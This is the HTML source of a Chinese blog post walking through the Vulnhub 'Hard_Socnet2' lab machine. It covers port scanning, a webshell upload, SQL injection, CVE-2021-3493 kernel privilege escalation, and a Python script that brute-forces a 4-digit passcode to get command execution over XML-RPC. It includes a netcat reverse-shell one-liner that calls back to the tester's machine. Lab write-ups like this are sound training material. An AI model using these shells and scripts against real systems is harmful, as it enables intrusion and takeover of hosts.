@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境搭建12渗透机：192.168.50.216靶机：192.168.50.43    端口探针1nmap -p- 192.168.50.43   服务探针1nmap -p22,80,8000 -sV 192.168.50.43    可知 80端口是一个Apache的一个Web页面； 8000端口是一个python开的一个Web服务 通过对80 8000 端口的分别访问  80是一个登陆界面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hard_Socnet2">
+<meta property="og:url" content="https://liangmosec.github.io/2024/02/22/Hard-Socnet2/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="环境搭建12渗透机：192.168.50.216靶机：192.168.50.43    端口探针1nmap -p- 192.168.50.43   服务探针1nmap -p22,80,8000 -sV 192.168.50.43    可知 80端口是一个Apache的一个Web页面； 8000端口是一个python开的一个Web服务 通过对80 8000 端口的分别访问  80是一个登陆界面">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165250319.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165511515.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165704606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165716873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222170236748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171317964.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171925374.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172256631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172419126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172907773.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173510469.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173756541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175354683.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222174051885.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175015454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222222943050.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175903488.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222180952995.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191220107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191507132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222194313769.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222195012112.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222200951904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202050996.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202702534.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222203152047.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204057490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204159710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204424234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204455545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204832573.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211542280.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211442585.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211945780.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212132389.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212627878.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222214209987.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222215257158.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220409213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220950638-1708611399263-40.png">
+<meta property="article:published_time" content="2024-02-22T14:15:34.000Z">
+<meta property="article:modified_time" content="2024-02-22T14:46:02.813Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165250319.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Hard_Socnet2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/19/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&text=Hard_Socnet2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&is_video=false&description=Hard_Socnet2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hard_Socnet2&body=Check out this article: https://liangmosec.github.io/2024/02/22/Hard-Socnet2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&name=Hard_Socnet2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&t=Hard_Socnet2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E9%92%88"><span class="toc-number">2.</span> <span class="toc-text">端口探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="toc-number">3.</span> <span class="toc-text">服务探针</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%80%EF%BC%9A%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权一：内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-3493"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2021-3493</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%BA%8C%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权二：缓冲区溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLRPC%E6%A8%A1%E5%9D%97"><span class="toc-number">6.1.</span> <span class="toc-text">XMLRPC模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%BE%97%E5%88%B0socnet%E6%9D%83%E9%99%90"><span class="toc-number">6.2.</span> <span class="toc-text">反弹shell得到socnet权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">7.</span> <span class="toc-text">调试程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93"><span class="toc-number">7.1.</span> <span class="toc-text">gdb命令总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Hard_Socnet2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-22T14:15:34.000Z" class="dt-published" itemprop="datePublished">2024-02-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Vulnhub/">Vulnhub</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">渗透机：192.168.50.216</span><br><span class="line">靶机：192.168.50.43</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="端口探针"><a href="#端口探针" class="headerlink" title="端口探针"></a>端口探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.50.43</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165250319.png" alt="image-20240222165250319"></p>
+<h2 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80,8000 -sV 192.168.50.43</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165511515.png" alt="image-20240222165511515"></p>
+<blockquote>
+<p>可知 80端口是一个Apache的一个Web页面；</p>
+<p>8000端口是一个python开的一个Web服务</p>
+<p>通过对80 8000 端口的分别访问  80是一个登陆界面  8000 501报错</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165704606.png" alt="image-20240222165704606"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222165716873.png" alt="image-20240222165716873"></p>
+<p>根据报错：请求方式错误</p>
+<p>可以尝试抓包改请求方式，看服务端支持哪种请求方式</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222170236748.png" alt="image-20240222170236748"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过尝试常见的请求方法 探针可用的方法（这里没有探针出来，但是提供思路点）</span><br><span class="line">OPTIONS GET POST PUT DELETE</span><br></pre></td></tr></table></figure>
+
+<p>很显然8000端口目前没有可利用点</p>
+<p>继续回到80端口</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171317964.png" alt="image-20240222171317964"></p>
+<p>可知需要Email和Password 才可登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尝试万能密码去尝试之后 发现 登陆不进去 发现还是要知道邮箱然后进行登陆</span><br><span class="line">目前所获得的信息 显然达不到爆破进入管理员后台</span><br><span class="line">Login页面旁的Sign Up 注册用户  是可以利用的一个点创建一个用户 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222171925374.png" alt="image-20240222171925374"></p>
+<p>发现可以任意用户创建登陆后台</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172256631.png" alt="image-20240222172256631"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172419126.png" alt="image-20240222172419126"></p>
+<blockquote>
+<p>可以知道存在 admin 用户 </p>
+<p>根据admin用户发布的文章可推测服务器存在一个python的脚本文件</p>
+<p>可能存在利用点</p>
+</blockquote>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222172907773.png" alt="image-20240222172907773"></p>
+<p>看了各种admin用户文章并没得到admin的邮箱</p>
+<p>通过尝试各种功能点，发现一个文件上传功能点</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173510469.png" alt="image-20240222173510469"></p>
+<p>成功上传且抓包过程中就能知道 文件上传所在位置</p>
+<p>（或者在头像处也可复制SHELL地址访问）</p>
+<p>然后用蚁剑连接尝试</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222173756541.png" alt="image-20240222173756541"></p>
+<p>连接成功</p>
+<p>通过文件上传即可拿到低权限shell</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175354683.png" alt="image-20240222175354683"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a    查看详细版本信息</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote>
+<p>只是能够得到admin邮箱从而登陆admin账号</p>
+<p>通过后台拿shell的权限是一样的</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222174051885.png" alt="image-20240222174051885"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索的表单提交含有SQL注入</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过SQL注入可以注入出admin的邮箱及密码</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175015454.png" alt="image-20240222175015454"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="提权一：内核提权"><a href="#提权一：内核提权" class="headerlink" title="提权一：内核提权"></a>提权一：内核提权</h2><p><a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222222943050.png" alt="image-20240222222943050"></p>
+<h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222175903488.png" alt="image-20240222175903488"></p>
+<blockquote>
+<p>通过返回来的命令 看起来已经成功了 </p>
+<p>可能已经提权成功了(可能：蚁剑SHELL不全所造成退出)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反弹shell  nc版本不支持-e参数 可尝试串联shell</span><br><span class="line">或者</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.50.216 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222180952995.png" alt="image-20240222180952995"></p>
+<h2 id="提权二：缓冲区溢出提权"><a href="#提权二：缓冲区溢出提权" class="headerlink" title="提权二：缓冲区溢出提权"></a>提权二：缓冲区溢出提权</h2><h3 id="XMLRPC模块"><a href="#XMLRPC模块" class="headerlink" title="XMLRPC模块"></a>XMLRPC模块</h3><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">xmlrpc — XMLRPC 服务端与客户端模块 — Python 3.12.2 文档</a></p>
+<blockquote>
+<p>XML-RPC 是一种远程过程调用方法，它使用通过 HTTP 传递的 XML 作为载体。 有了它，客户端可以在远程服务器上调用带参数的方法（服务器以 URI 命名）并获取结构化的数据。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191220107.png" alt="image-20240222191220107"></p>
+<p>查看可登陆的用户，去到它的家目录  </p>
+<p>发现存在 monitor.py  这对应了管理员发的文章,查看进程看脚本是否运行</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222191507132.png" alt="image-20240222191507132"></p>
+<p>可知 该程序是正在运行的 由于是python 又可以直接进入socnet目录查看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runcmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mem</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disk</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">net</span>():</span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>根据服务器代码写出发送请求代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(proxy.net()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222194313769.png" alt="image-20240222194313769"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line">        </span><br><span class="line">该方法 可以自定义代码进行RCE 前提是 要知道 passcode        </span><br></pre></td></tr></table></figure>
+
+<p>由于 passcode&#x3D;&#x3D;debugging_pass；</p>
+<p>而debugging_pass &#x3D; random.randint(1000,9999)</p>
+<p>故可以尝试 暴力破解 passcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">        r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&#x27;whoami&#x27;</span>,i))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(r)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222195012112.png" alt="image-20240222195012112"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功爆破出passcode 9935  也成功执行了whoami命令</span><br></pre></td></tr></table></figure>
+
